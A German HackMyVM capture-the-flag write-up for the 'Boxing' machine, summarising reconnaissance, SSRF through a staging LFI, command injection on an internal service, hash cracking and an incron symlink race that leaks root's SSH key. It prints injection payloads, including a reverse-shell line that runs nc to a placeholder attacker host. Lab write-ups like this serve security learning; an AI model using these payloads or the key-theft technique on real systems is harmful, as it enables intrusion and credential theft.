# Boxing - HackMyVM Writeup

![Boxing VM Icon](Boxing.png)

Dieses Repository enthält das Writeup für die HackMyVM-Maschine "Boxing" (Schwierigkeitsgrad: Medium), erstellt von DarkSpirit. Ziel war es, initialen Zugriff auf die virtuelle Maschine zu erlangen und die Berechtigungen bis zum Root-Benutzer zu eskalieren.

## VM-Informationen

*   **VM Name:** Boxing
*   **Plattform:** HackMyVM
*   **Autor der VM:** DarkSpirit
*   **Schwierigkeitsgrad:** Medium
*   **Link zur VM:** [https://hackmyvm.eu/machines/machine.php?vm=Boxing](https://hackmyvm.eu/machines/machine.php?vm=Boxing)

## Writeup-Informationen

*   **Autor des Writeups:** Ben C.
*   **Datum des Berichts:** 29. April 2024
*   **Link zum Original-Writeup (GitHub Pages):** [https://alientec1908.github.io/Boxing_HackMyVM_Medium/](https://alientec1908.github.io/Boxing_HackMyVM_Medium/)

## Kurzübersicht des Angriffspfads

Der Angriff auf die Boxing-Maschine umfasste mehrere Stufen und die Ausnutzung verschiedener Schwachstellen:

1.  **Reconnaissance:**
    *   Identifizierung der Ziel-IP (`192.168.2.114` unter dem Hostnamen `boxing.hmv`) mittels `arp-scan`.
    *   Ein `nmap`-Scan offenbarte zwei offene Ports: SSH (22, OpenSSH 9.2p1) und HTTP (80, Apache 2.4.57, Titel "Oxer").
2.  **Web Enumeration:**
    *   `nikto`, `dirb` und `gobuster` wurden zur Enumeration des Webservers auf Port 80 eingesetzt. Wichtige Funde waren `/images/`, `/css/`, `/js/` (mit Directory Indexing), `index.html` und `feedback.php`.
    *   Technologie-Stack: Apache, PHP, Debian, jQuery, Bootstrap.
    *   Ein Command Injection-Versuch gegen `feedback.php` wurde dokumentiert, dessen Erfolg aber unklar blieb.
3.  **Staging Environment Analysis & SSRF:**
    *   Hinweise (E-Mail `demo@boxing.hmv`, HTTP-Header `X-Origin-Domain: staging-env.boxing.hmv`) führten zur Entdeckung einer Staging-Umgebung unter `staging-env.boxing.hmv`.
    *   In einer Feedback-Nachricht wurde der Passwort-Hinweis "Cassius!" gefunden.
    *   Die Staging-Seite (`staging-env.boxing.hmv/index.php`) hatte eine Local File Inclusion (LFI)-Schwachstelle im `url`-Parameter, die für Server-Side Request Forgery (SSRF) ausgenutzt wurde.
    *   Mittels SSRF wurden von der Produktionsseite (`boxing.hmv`) potenzielle Benutzernamen (`moe`, `daro`, `uji`) extrahiert.
    *   Ein interner Portscan via SSRF auf `localhost` (des Staging-Servers) mit `ffuf` entdeckte einen Dienst auf Port 5000.
4.  **RCE via Staging & Initial Access (www-data):**
    *   Der Dienst auf `localhost:5000` (erreichbar via SSRF) zeigte ein Formular, das nach einem "Process name" fragte.
    *   Fuzzing des `processName`-Parameters mit `ffuf` und Sonderzeichen identifizierte das `+`-Zeichen (URL-kodiert `%2B`) als Schlüssel zur Command Injection.
    *   Mit einem Payload wie `processName=system%2B-e%2Bid` wurde RCE als `www-data` auf dem Host-System (wo der Port 5000 Dienst lief) bestätigt.
    *   Eine Reverse Shell wurde über die RCE-Schwachstelle initiiert (`processName=system%2B-e%2Bnc%2B-c%2Bbash%2BATTACKER_IP%2BPORT`), was zu einer Shell als `www-data` führte.
5.  **Privilege Escalation (www-data zu cassius):**
    *   Über LFI auf der Staging-Umgebung wurde eine SQLite-Datenbank (`boxing_database.db`) heruntergeladen.
    *   `strings` auf die Datenbank offenbarte einen bcrypt-Hash für den Benutzer `cassius`.
    *   Der Hash wurde mit `john` und einer Wordlist (basierend auf dem Hinweis "Cassius!") geknackt. Das Passwort war `Cassius!123`.
    *   Mit `su cassius` und dem geknackten Passwort wurde zum Benutzer `cassius` gewechselt.
    *   Die User-Flag (`/home/cassius/user.txt`) wurde gelesen.
6.  **Privilege Escalation (cassius zu root via Incron):**
    *   Als `www-data` wurde im Verzeichnis `/opt/sos` das Skript `incrontab.sh` gefunden. Dieses richtete eine `incron`-Regel ein, die bei Attributänderung von `/home/cassius/user.txt` das Skript `/opt/sos/sos.sh` als `root` ausführt.
    *   `sos.sh` wechselte nach `/home/cassius`, führte dort `file *` aus (dessen Ausgabe in `/opt/sos/logs/output-logs.txt` landete) und setzte am Ende `chmod 700` auf die Logdatei.
    *   Als `cassius` wurde ein Symlink `rootrsa` in `/home/cassius` erstellt, der auf `/root/.ssh/id_rsa` zeigte.
    *   Eine Endlosschleife wurde gestartet, um `/opt/sos/logs/output-logs.txt` nach `/home/cassius/` zu kopieren (Race Condition).
    *   Durch `chmod 700 /home/cassius/user.txt` wurde der Incron-Job getriggert.
    *   Der private SSH-Schlüssel von Root wurde aus der kopierten Logdatei (`output.log`) extrahiert.
    *   Erfolgreicher SSH-Login als `root` mit dem exfiltrierten Schlüssel.
7.  **Flags:**
    *   Die User-Flag wurde als `cassius` gelesen.
    *   Die Root-Flag (`/root/root.txt`) wurde als `root` gelesen.

## Verwendete Tools

*   `arp-scan`
*   `vi`
*   `nmap`
*   `grep`
*   `nikto`
*   `dirb`
*   `gobuster`
*   `curl`
*   Burp Suite (impliziert für Request-Analyse)
*   `sqlmap`
*   `wfuzz`
*   `ffuf`
*   `wget`
*   `strings`
*   `john`
*   `echo`
*   `su`
*   `cat`
*   `ls`
*   `cd`
*   `touch`
*   `ln`
*   `chmod`
*   `cp`
*   `head`
*   `awk`
*   `tr`
*   `ssh`

## Identifizierte Schwachstellen (Zusammenfassung)

*   **Directory Indexing:** Mehrere Verzeichnisse auf dem Webserver waren auflistbar.
*   **Local File Inclusion (LFI) / Server-Side Request Forgery (SSRF):** Der `url`-Parameter in `staging-env.boxing.hmv/index.php` war anfällig für LFI, was zu SSRF ausgenutzt wurde.
*   **Remote Code Execution (RCE) via SSRF:** Ein interner Dienst auf Port 5000 (erreichbar via SSRF) hatte eine Command Injection-Schwachstelle im `processName`-Parameter.
*   **Preisgabe eines Passwort-Hashes in Datenbank:** Eine via LFI/SSRF zugängliche SQLite-Datenbank enthielt einen bcrypt-Hash für den Benutzer `cassius`.
*   **Schwaches Passwort:** Das Passwort für `cassius` (`Cassius!123`) konnte aus einem Hinweis abgeleitet und geknackt werden.
*   **Unsichere `incron`-Konfiguration:** Eine `incron`-Regel führte ein Skript als `root` aus, wenn die Attribute einer benutzerkontrollierten Datei geändert wurden. Dieses Skript führte Befehle in einem benutzerkontrollierten Verzeichnis aus (`file *` in `/home/cassius`), was zur Exfiltration des privaten Root-SSH-Schlüssels durch einen Symlink und eine Race Condition missbraucht wurde.

## Flags

*   **User Flag (`/home/cassius/user.txt`):** `a2b3946358a96bb7a92f61a759a1d972`
*   **Root Flag (`/root/root.txt`):** `19ed17ba1da85521ce659aeeb5ecd751`

---

**Wichtiger Hinweis:** Dieses Dokument und die darin enthaltenen Informationen dienen ausschließlich zu Bildungs- und Forschungszwecken im Bereich der Cybersicherheit. Die beschriebenen Techniken und Werkzeuge sollten nur in legalen und autorisierten Umgebungen (z.B. eigenen Testlaboren, CTFs oder mit expliziter Genehmigung) angewendet werden. Das unbefugte Eindringen in fremde Computersysteme ist eine Straftat und kann rechtliche Konsequenzen nach sich ziehen.

---
*Bericht von Ben C. - Cyber Security Reports*
